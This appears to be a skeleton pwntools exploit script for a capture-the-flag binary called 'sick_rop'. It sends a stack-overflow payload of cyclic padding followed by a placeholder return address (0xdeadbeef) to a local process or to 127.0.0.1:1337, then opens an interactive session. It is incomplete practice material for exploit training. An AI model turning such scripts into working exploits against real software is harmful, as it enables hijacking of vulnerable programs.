#!/usr/bin/env python3
from pwn import *

def conn():
    if args.REMOTE:
        p = remote("127.0.0.1", 1337)
    else:
        p = process("./given/sick_rop")
        if args.D:
            gdb.attach(p, """
                    b *0x40104e
                    """)
    return p

def exploit():
    p = conn()
    payload = b"a" * cyclic_find("kaaa")
    payload += p64(0xdeadbeef)
    p.send(payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
